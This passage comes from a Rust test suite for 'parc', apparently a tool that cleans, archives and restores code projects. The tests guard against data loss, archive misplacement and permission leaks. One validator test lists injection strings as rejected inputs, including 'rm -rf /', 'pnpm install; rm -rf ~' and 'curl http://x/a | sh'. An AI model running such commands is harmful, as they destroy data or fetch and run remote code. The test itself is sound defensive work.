}

/// How well a file compresses has nothing to do with when it was last worked on.
/// Only compressible files updated the project's mtime, so a video rendered this
/// morning counted for nothing and the project reported an age of 900 days -
/// which is exactly what `--older-than` uses to decide what to clean and archive.
#[test]
fn a_video_rendered_today_keeps_the_project_alive() {
    let f = Fixture::new();
    f.file("index.html", "<html>").file("package.json", "{}");
    f.age_file("index.html", 900).age_file("package.json", 900);

    // The only recent work is an asset, which is how a design project looks.
    f.file("render.mp4", "FRESH VIDEO");

    let p = scan::analyze(f.path());
    let age = p.age_days().expect("age must be computable");
    assert!(
        age < 7,
        "a video rendered today must keep the project alive (age: {age}d)"
    );
}

/// `.git` is written by every git command that runs, including the one in a shell
/// prompt. It must not be what makes a project look alive.
#[test]
fn git_internals_do_not_date_a_project() {
    let f = Fixture::new();
    f.repo().file("src/index.js", "old").commit();
    f.age_file("src/index.js", 800);

    let p = scan::analyze(f.path());
    // `.git` was written seconds ago by `commit`, but the source is 800 days old
    // and there is no commit date to argue with (the commit is from today, so the
    // *project* is recent) - what matters is that `last_modified` came from the
    // source tree, not from `.git`.
    let touched = p.last_modified.expect("mtime must exist");
    let src = fs::metadata(f.path().join("src/index.js"))
        .unwrap()
        .modified()
        .unwrap()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64;
    assert_eq!(touched, src, ".git files must not make the project look fresh");
}

/// An archive written inside the project is not an archive of it: `parc archive`
/// moves the project to the Trash afterwards, and the archive goes with it.
#[test]
fn an_archive_never_lands_inside_the_project_it_archives() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("src/index.js", "1")
        .commit();

    let err = parc::archive::create(
        f.path(),
        &parc::archive::Options {
            out_dir: f.path().join("backups"),
            level: 1,
            delete: true,
            force: true,
            overwrite: false,
            yes: true,
            encrypt: None,
        },
    )
    .unwrap_err();

    assert!(err.to_string().contains("inside the project"), "{err}");
    assert!(f.path().join("src/index.js").exists(), "project was moved");
}

/// The same guard, reached the way a person actually reaches it.
///
/// The test above passes an absolute `out_dir`, and that is the only shape the
/// guard used to catch. `--out backups` off the command line is relative, and a
/// relative path that does not exist yet cannot be canonicalized - so the guard
/// compared `backups` against `/abs/project`, found no prefix, and waved it
/// through. The archive landed in the tree and went to the Trash with it: `parc`
/// printed "344 KB freed" over a project whose only archive was inside it.
#[test]
fn a_relative_out_dir_inside_the_project_is_caught_too() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("src/index.js", "1")
        .commit();

    // Driven through the binary, not `archive::create` directly: a relative
    // `--out` only means anything against a working directory, and setting the
    // process-wide one from a test thread would race the sixty tests beside it.
    // A child process has a cwd of its own - which is also exactly how a person
    // hits this.
    let run = Command::new(env!("CARGO_BIN_EXE_parc"))
        .current_dir(f.path())
        .args(["archive", ".", "--out", "backups", "--yes", "--force"])
        .output()
        .unwrap();

    let err = String::from_utf8_lossy(&run.stderr);
    assert!(!run.status.success(), "it should have refused to archive");
    assert!(err.contains("inside the project"), "{err}");
    assert!(f.path().join("src/index.js").exists(), "project was moved");
    assert!(
        !f.path().join("backups").exists(),
        "the archive directory was created inside the project"
    );
}

/// `git status` answers for the whole repository. Run inside one package of a
/// monorepo it reported the *other* packages' untracked files - and `plan` listed
/// them under "these live only in the archive", which the archive of this package
/// could not possibly keep. Promising to preserve a file we are not going to
/// archive is worse than not mentioning it.
#[test]
fn orphans_do_not_leak_from_a_sibling_package() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file(".gitignore", "*.env\nuploads/\n")
        .file("apps/api/package.json", "{}")
        .file("apps/api/pnpm-lock.yaml", "lockfileVersion: 9")
        .file("apps/api/src/index.js", "1")
        .file("apps/api/prod.env", "API_SECRET=1")
        .file("apps/web/package.json", "{}")
        .file("apps/web/prod.env", "WEB_SECRET=1")
        .file("apps/web/uploads/photo.bin", "xxxx")
        .commit();

    let p = scan::analyze(&f.path().join("apps/api"));
    let paths: Vec<&str> = p.orphans.iter().map(|o| o.path.as_str()).collect();

    assert!(
        !paths.iter().any(|o| o.contains("web")),
        "a sibling package's files leaked into this project's report: {paths:?}"
    );
    // Its own is there, named relative to the project - the path you would type.
    assert!(paths.contains(&"prod.env"), "{paths:?}");
}

/// A `pnpm-lock.yaml` pins `node_modules`. It says nothing about whether
/// `pod install` can put back the same CocoaPods - and with no `Podfile.lock` it
/// cannot. Any-lockfile-will-do let a Node lockfile authorize deleting `ios/Pods`.
#[test]
fn a_node_lockfile_does_not_authorize_deleting_pods() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", r#"{"dependencies":{"react-native":"0.74"}}"#)
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("ios/App.xcodeproj/project.pbxproj", "// xcode")
        .file("ios/Podfile", "platform :ios")
        // No Podfile.lock: the versions are not pinned.
        .file(".gitignore", "node_modules\nios/Pods/\n")
        .file("src/App.js", "1")
        .heavy("node_modules/left-pad")
        .heavy("ios/Pods/Firebase")
        .commit();

    let p = scan::analyze(f.path());
    assert_eq!(
        artifact(&p, "ios/Pods").class,
        Class::Review,
        "with no Podfile.lock, Pods must not be considered deletable"
    );
    // The tree it *does* pin is still cleared: the fix must not turn into a
    // blanket refusal.
    assert_eq!(artifact(&p, "node_modules").class, Class::Confirmed);
}

/// The other half of that rule, and a real project: Expo generates the whole
/// native tree, so its `.gitignore` says `/ios` and nothing else. The ignore
/// pattern therefore never names `Pods` - but a `Podfile.lock` is sitting right
/// next to it, and `pod install` puts back exactly what was there. Refusing to
/// clean 1.1 GB of CocoaPods because git phrased its ignore broadly is a
/// different kind of wrong, and it forces the whole 1.1 GB into the archive.
#[test]
fn a_wholly_ignored_ios_directory_still_yields_its_pods() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", r#"{"dependencies":{"expo":"51"}}"#)
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        // Exactly what `expo prebuild` leaves behind.
        .file(".gitignore", "node_modules\n/ios\n/android\n")
        .file("ios/App.xcodeproj/project.pbxproj", "// generated")
        .file("ios/Podfile", "platform :ios")
        .file("ios/Podfile.lock", "COCOAPODS: 1.15")
        .file("src/App.js", "1")
        .heavy("node_modules/left-pad")
        .heavy("ios/Pods/Firebase")
        .commit();

    let p = scan::analyze(f.path());
    assert_eq!(
        artifact(&p, "ios/Pods").class,
        Class::Confirmed,
        "a Podfile.lock sits beside it - Pods can be restored: {:?}",
        p.artifacts
    );

    let c = cmds(f.path(), &p);
    assert!(c.contains(&"pod install".to_string()), "{c:?}");
}

/// And the line between the two: a generic name has no package manager to vouch
/// for it, so a broadly-phrased ignore is not enough. `out/` under an ignored
/// `/ios` is not `Pods` - nothing puts it back.
#[test]
fn a_wholly_ignored_directory_does_not_yield_its_generic_subdirectories() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", "node_modules\n/sandbox\n")
        .file("src/index.js", "1")
        .heavy("sandbox/out")
        .commit();

    let p = scan::analyze(f.path());
    assert_eq!(artifact(&p, "sandbox/out").class, Class::Review);
}

/// With a `Podfile.lock` in hand, `pod install` is a promise again.
#[test]
fn a_podfile_lock_does_authorize_deleting_pods() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", r#"{"dependencies":{"react-native":"0.74"}}"#)
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("ios/App.xcodeproj/project.pbxproj", "// xcode")
        .file("ios/Podfile", "platform :ios")
        .file("ios/Podfile.lock", "COCOAPODS: 1.15")
        .file(".gitignore", "node_modules\nios/Pods/\n")
        .file("src/App.js", "1")
        .heavy("ios/Pods/Firebase")
        .commit();

    let p = scan::analyze(f.path());
    assert_eq!(artifact(&p, "ios/Pods").class, Class::Confirmed);
}

/// `parc backup .` recorded `./foo` as where the project lived. A relative path
/// in a manifest is not an address - it is whatever directory the next shell
/// happens to be in. `restore --original` would put the project somewhere else,
/// and `rm` would decide the original was gone and call the archive a last copy.
#[test]
fn a_manifest_records_an_absolute_home() {
    let lib = Fixture::new();
    let proj = Fixture::new();
    let file = archived(&proj, &lib);

    let mf = parc::archive::read_manifest(&file, None).unwrap();
    assert!(
        Path::new(&mf.original_path).is_absolute(),
        "a relative path was recorded: {}",
        mf.original_path
    );
    assert!(Path::new(&mf.original_path).exists());
}

// ---------------------------------------------------------------------------
// git that cannot answer.
//
// Every deletion this tool makes is vouched for by git: `tracks_anything_under`
// is what keeps `clean` off a committed `node_modules`, and the ignored and
// untracked lists are what produce the orphan list, the one that names the
// files which exist nowhere else. All of it comes out of two git commands.
//
// When those commands *fail*, they fail the way good news looks: nothing tracked,
// nothing ignored, nothing untracked. Read as "not a git repository", a git that
// merely could not run flips a tracked `node_modules` from UNTOUCHED to
// WILL BE DELETED, empties "archive-only" of the `.env` and the `uploads/`,
// and prints "not a git repository" about a directory with a `.git` sitting in it.
//
// It is not a hypothetical. `/usr/bin/git` exists on a Mac with no developer
// tools behind it and exits 1 on every call; `safe.directory` refuses a tree
// owned by another user, which is exactly what an old external drive full of
// projects is; a worktree outlives the repo it was cut from and its `.git` becomes
// a pointer to nothing. The fixtures below take that last route, because it needs
// no `PATH` games and is the one an archiver meets first.
// ---------------------------------------------------------------------------

/// A project git can see is a repository, but cannot read: `.git` is a pointer to
/// a repo that no longer exists. Every git command here exits 128.
fn unreadable_repo() -> Fixture {
    let f = Fixture::new();
    f.file("package.json", r#"{"name":"a","scripts":{"build":"tsc"}}"#)
        .file("package-lock.json", "{}")
        .file("src/index.js", "1")
        .file(".env", "SECRET=1")
        .heavy("node_modules/left-pad")
        .file(".git", "gitdir: /nonexistent/repo/.git/worktrees/gone");
    f
}

#[test]
fn a_git_that_cannot_answer_is_not_a_project_without_git() {
    let f = unreadable_repo();
    let p = scan::analyze(f.path());

    // The distinction the whole fix rests on. Answering "not a repository" here
    // is a false statement about a directory with a `.git` in it, and it is the
    // statement that authorizes the deletion below.
    assert_eq!(
        artifact(&p, "node_modules").class,
        Class::Review,
        "node_modules considered deletable even though git could not be asked"
    );
    assert_eq!(p.verdict, Verdict::Review);
    assert!(
        p.reasons.iter().any(|r| r.contains("git could not be run")),
        "it was never said that git did not run: {:?}",
        p.reasons
    );
}

/// The tool's own safety net, checked from the outside: nothing is Confirmed, so
/// `clean`, which unlinks outright and never uses the Trash, has nothing to take.
#[test]
fn clean_takes_nothing_from_a_project_it_could_not_ask_git_about() {
    let f = unreadable_repo();
    let p = scan::analyze(f.path());

    assert_eq!(
        p.artifact_size, 0,
        "bytes to delete were found without asking git"
    );
    let freed = parc::clean::run(
        std::slice::from_ref(&p),
        &parc::clean::Options {
            yes: true,
            dry_run: false,
        },
    )
    .unwrap();

    assert_eq!(freed, 0);
    assert!(
        f.path().join("node_modules/left-pad/payload.js").exists(),
        "clean deleted files from a project it could not ask git about"
    );
}

/// `archive` moves the project to the Trash. It refuses a REVIEW project without
/// `--force`, and a git it could not read must be exactly that: the archive would
/// be written from an orphan list we know is a lie.
#[test]
fn archive_refuses_a_project_whose_git_it_could_not_read() {
    let f = unreadable_repo();
    let lib = Fixture::new();

    let err = parc::archive::create(
        f.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            delete: true,
            force: false,
            overwrite: false,
            yes: true,
            encrypt: None,
        },
    )
    .unwrap_err()
    .to_string();

    assert!(err.contains("REVIEW"), "unexpected error: {err}");
    assert!(
        f.path().join("src/index.js").exists(),
        "project was moved: even though the archive was refused"
    );
}

/// The other half of the same hole, and the one that gives the worst advice: git
/// answers `rev-parse` but fails on `status --ignored`. The ignored, untracked
/// and dirty counts all come back empty: a clean repo, fully pushed. And this
/// tool calls that REDUNDANT and tells you to delete it.
///
/// Reproduced with a corrupt `.git/index` (an interrupted git operation, a bad
/// sector) which `status` must read and `rev-parse --show-toplevel` never looks
/// at. The repo stays a repo; only the question we actually need answered fails.
#[test]
fn a_repo_whose_status_fails_is_never_called_redundant() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", r#"{"name":"a"}"#)
        .file("src/index.js", "1")
        .commit()
        .git(&["remote", "add", "origin", "https://example.com/a.git"]);

    fs::write(f.path().join(".git/index"), "not an index").unwrap();

    let st = parc::git::status(f.path());
    assert!(
        st.unavailable,
        "status failed but went unnoticed: silently assumed a 'clean repo'"
    );

    let p = scan::analyze(f.path());
    assert_ne!(
        p.verdict,
        Verdict::Redundant,
        "a repo whose status could not be read was reported 'complete on the remote, deletable'"
    );
}

/// An encrypted archive that lost its `.age` suffix must still open.
///
/// The passphrase prompt keyed off the *name*, while `crypto::open` keyed off the
/// age magic in the bytes - so for a renamed archive the two disagreed, and the one
/// that decided whether to ask for a passphrase said "not encrypted". No passphrase
/// was collected, `open` found ciphertext and refused, and `show`, `verify` and
/// `restore` all failed on an archive whose passphrase was sitting right there in
/// the environment. `list` had already printed it as 🔒 encrypted and told the user to
/// run `parc show` on it; `rm` was guarding it as a possible last copy. The tool
/// protected a file it could no longer open, which is the one shape of bug an
/// archiver cannot have.
#[test]
fn a_renamed_encrypted_archive_still_opens() {
    use age::secrecy::SecretString;

    let lib = Fixture::new();
    let proj = Fixture::new();
    proj.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("src/index.js", "secret source")
        .repo()
        .commit();

    let pass = SecretString::from("secret".to_string());
    let enc = parc::archive::create(
        proj.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            delete: false,
            force: false,
            overwrite: false,
            yes: true,
            encrypt: Some(pass.clone()),
        },
    )
    .unwrap();

    // Drop the `.age`: only the bytes betray that it is encrypted now.
    let renamed = lib.path().join("renamed.parc.tar.zst");
    fs::rename(&enc, &renamed).unwrap();

    assert!(
        parc::crypto::is_encrypted_content(&renamed),
        "an encrypted archive forgot it was encrypted after being renamed"
    );

    // This is what `unlock` has to get right: the passphrase is needed, and nothing
    // but the file's first bytes can say so.
    let mf = parc::archive::read_manifest(&renamed, Some(&pass))
        .expect("a renamed encrypted archive could not be opened with its passphrase");
    assert_eq!(mf.original_path, proj.path().display().to_string());

    let rep = parc::archive::verify(&renamed, Some(&pass)).unwrap();
    assert!(rep.ok(), "a renamed encrypted archive could not be verified");
}

/// A library on another volume: the old archive must not be lost, and the new one
/// must not be orphaned.
///
/// `move_to_trash` was `rename(2)` into `~/.Trash`, which cannot cross a
/// filesystem - so on an archive library kept on an external disk, `--overwrite`
/// failed *after* the new archive was already written. The finished archive was
/// left under its `.partial` name, which `list` does not show; the library went on
/// presenting the stale archive as current, so a weekly `backup --overwrite` cron
/// refreshed nothing and reported nothing wrong. The error named the path holding
/// the *old* archive as "the new archive" and told the user to delete it.
///
/// The trash now goes on the volume the file is already on. There is nothing to
/// cross.
#[test]
fn an_archive_library_on_another_volume_can_still_be_overwritten() {
    let lib = Fixture::new();
    let proj = Fixture::new();
    proj.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("src/index.js", "1")
        .repo()
        .commit();

    let opts = |overwrite| parc::archive::Options {
        out_dir: lib.path().to_path_buf(),
        level: 1,
        delete: false,
        force: false,
        overwrite,
        yes: true,
        encrypt: None,
    };

    let first = parc::archive::create(proj.path(), &opts(false)).unwrap();
    let before = fs::read(&first).unwrap();

    // The project grows, and the weekly refresh runs again.
    proj.file("src/two.js", "2");
    let second = parc::archive::create(proj.path(), &opts(true)).unwrap();

    assert_eq!(first, second, "a refreshed archive must keep the same name");
    assert_ne!(
        fs::read(&second).unwrap(),
        before,
        "the archive was said to be refreshed but the file is still the old one"
    );

    // Nothing invisible left behind: everything `parc list` cannot see is something
    // the user does not know they have.
    let strays: Vec<_> = fs::read_dir(lib.path())
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().to_string())
        .filter(|n| n.ends_with(".partial"))
        .collect();
    assert!(strays.is_empty(), "a half-written archive was left behind: {strays:?}");

    // And the archive it replaced is recoverable, wherever the trash for that volume
    // turned out to be.
    let items = parc::archive::list(lib.path()).unwrap();
    assert_eq!(items.len(), 1, "the library must hold a single archive");
}

/// A build directory can be real output and still hold files a build never makes:
/// model weights, a dataset, a database dropped into `out/` because the folder was
/// there. The name and an adjacent `build` script both say "generated", but a
/// rebuild writes to `dist/`, not here, and would never bring the data back - so it
/// is REVIEW, not deletable. This is the model-checkpoint incident the tool once
/// lost data to: an existence-only "there is a build command" check called it safe.
#[test]
fn a_build_dir_holding_user_data_is_never_deleted() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", r#"{"scripts":{"build":"vite build"}}"#)
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", "out/\n")
        .file("src/index.ts", "export const x = 1")
        // `vite build` writes to `dist/`; this `out/` is hand-made and in no git tree.
        .file("out/model-final.safetensors", &"w".repeat(4096))
        .file("out/notes.md", "three weeks of training")
        .commit();

    let p = scan::analyze(f.path());
    let out = artifact(&p, "out");
    assert_eq!(out.class, Class::Review, "{:?}", out.note);
    assert_eq!(p.artifact_size, 0, "a build directory holding data must not be considered deletable");

    // Control: a `dist/` of nothing but build output stays deletable. The guard
    // fires on the contents, not the name.
    let g = Fixture::new();
    g.repo()
        .file("package.json", r#"{"scripts":{"build":"vite build"}}"#)
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", "dist/\n")
        .file("src/index.ts", "export const x = 1")
        .file("dist/bundle.js", &"x".repeat(4096))
        .file("dist/style.css", "body{}")
        .commit();
    assert_eq!(artifact(&scan::analyze(g.path()), "dist").class, Class::Confirmed);
}

/// An archive is a plaintext copy of every secret the project kept - `.env`,
/// service keys. Written world-readable, any other account on the machine could
/// read them straight out of it, so the file is `0600` from the first byte.
#[test]
fn a_plaintext_archive_is_private() {
    use std::os::unix::fs::PermissionsExt;

    let lib = Fixture::new();
    let proj = Fixture::new();
    let file = archived(&proj, &lib);

    let mode = fs::metadata(&file).unwrap().permissions().mode();
    assert_eq!(mode & 0o077, 0, "the archive is readable by others: {mode:o}");
}

/// The last-copy guard cannot be undone by re-creating the old directory. An empty
/// folder - or an unrelated project - sitting where the original used to be is not
/// the original, and the archive is still the only copy. Keying the guard off bare
/// path existence let a re-created directory wave a last-copy archive through `rm`.
#[test]
fn a_recreated_empty_dir_does_not_expose_the_last_copy() {
    let lib = Fixture::new();
    let proj = Fixture::new();
    let file = archived(&proj, &lib);

    // The original is gone, and something empty takes its exact place.
    fs::remove_dir_all(proj.path()).unwrap();
    fs::create_dir_all(proj.path()).unwrap();

    let err = parc::archive::remove(
        lib.path(),
        std::slice::from_ref(&file),
        &parc::archive::RemoveOptions { force: false, yes: true },
    )
    .unwrap_err();

    assert!(
        err.to_string().contains("project could be lost"),
        "the reason for refusal must be stated: {err}"
    );
    assert!(file.exists(), "the last copy was deleted");
}

/// `restore` runs the commands in a manifest, and a manifest is unsigned data. A
/// command that is not a recognised build/package-manager invocation is refused, so
/// a crafted archive cannot turn `restore --yes` into arbitrary code execution.
#[test]
fn a_restore_command_that_parc_would_never_write_is_refused() {
    use parc::recipe::{self, is_safe_command, Step};

    // Every shape parc actually generates passes, including the two that chain with
    // `&&` (CMake configure-then-build, venv create-then-fill).
    for ok in [
        "pnpm install",
        "npm run build",
        "cargo build",
        "./gradlew build",
        "mvn package -DskipTests",
        "cmake -S . -B build && cmake --build build",
        "python3 -m venv .venv && .venv/bin/pip install -r requirements.txt",
    ] {
        assert!(is_safe_command(ok), "must be considered safe: {ok}");
    }
    // Injection attempts do not.
    for bad in [
        "pnpm install; rm -rf ~",
        "pnpm install && rm -rf /",
        "curl http://x/a | sh",
        "npm install `curl x`",
        "echo pwned > /tmp/x",
        "pnpm install & sleep 1",
        "rm -rf /",
    ] {
        assert!(!is_safe_command(bad), "must be considered unsafe: {bad}");
    }

    // And `execute` refuses the whole recipe, running nothing, the moment one
    // command is unrecognised - the side effect never happens.
    let f = Fixture::new();
    let steps = vec![Step {
        cmd: "touch pwned".into(),
        dir: None,
        why: "x".into(),
        optional: false,
    }];
    assert_eq!(recipe::execute(f.path(), &steps, true), Some(0));
    assert!(!f.path().join("pwned").exists(), "an unsafe command was run");
}

/// `clean` re-checks each artifact against the project as it is at delete time, not
/// as the scan saw it. A lockfile removed after the scan (during the confirmation
/// prompt, say) makes a `node_modules` un-rebuildable, and it is left alone even
/// though the stale plan still called it Confirmed.
#[test]
fn clean_re_checks_before_deleting() {
    let f = Fixture::new();
    f.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .heavy("node_modules/left-pad");

    let p = scan::analyze(f.path());
    assert_eq!(artifact(&p, "node_modules").class, Class::Confirmed);

    // Between scan and delete the lockfile disappears: now nothing puts the tree
    // back, so removing it is no longer reversible.
    fs::remove_file(f.path().join("pnpm-lock.yaml")).unwrap();

    let freed = parc::clean::run(
        std::slice::from_ref(&p),
        &parc::clean::Options {
            yes: true,
            dry_run: false,
        },
    )
    .unwrap();

    assert_eq!(freed, 0, "an artifact whose status changed was deleted");
    assert!(
        f.path().join("node_modules/left-pad/payload.js").exists(),
        "node_modules was deleted"
    );
}

/// The walk never descends into `.git`. A directory inside it whose name matches a
/// rule is git's, not a deletion candidate - and deleting anything under `.git`
/// corrupts the repository. Discovery already skipped `.git`; the walk did not.
#[test]
fn an_artifact_named_dir_inside_git_is_never_a_candidate() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("src/index.js", "1")
        .commit();
    // Something named like an artifact, sitting inside `.git`.
    f.heavy(".git/.next/cache");

    let p = scan::analyze(f.path());
    assert!(
        !p.artifacts.iter().any(|a| a.path.starts_with(".git")),
        "something inside `.git` became a candidate: {:?}",
        p.artifacts.iter().map(|a| &a.path).collect::<Vec<_>>()
    );
}
